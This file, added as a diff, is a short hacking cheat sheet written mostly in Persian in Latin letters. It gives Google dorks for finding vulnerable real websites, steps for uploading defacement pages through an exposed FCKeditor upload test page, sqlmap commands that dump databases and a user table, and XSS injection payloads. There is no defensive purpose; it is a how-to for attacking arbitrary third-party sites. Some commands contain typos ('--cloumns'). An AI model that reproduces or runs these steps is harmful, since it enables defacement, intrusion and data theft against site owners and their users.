@@ -1,0 +1,31 @@
+Dork DefacePage 
+
+inurl:frame=product_detail       SEARCH MIKONI VA YEKI AZ SITE HARO BAZ MIKONI
+
+
+/jscripts/FCKeditor/editor/filemanager/upload/test.html   (( MATN RO COPY MIKONI VA BAD AZ .COM PASTE MIKONI VA DEFACE RO UPLOAD MIKONI ))
+
+
+BAD AZ INKARA LINKI KE BEHET MIDE RO COPY MIKONI VA BAD AZ .COM PASTE MIKONI TA DEFACE BAZ BESHE   
+
+**********************************
+
+DorK SQL  (( AZ GOOGLE KOMK BEGIR ))
+
+php?=id
+
+sqlmap -u URL --dbs
+
+sqlmap -u URL -D @@ --tables
+
+sqlmap -u URL -D @@ -T user_sites --cloumns
+
+**********************************
+xss : cross site scripting
+
+Dork :
+inurl:"/showcatrows.php?CategoryID="
+
+"><marquee><h1>??????</h1></mmarque
+
+Search Site And Add This Xss Dork <script>alert("Xss")</script>
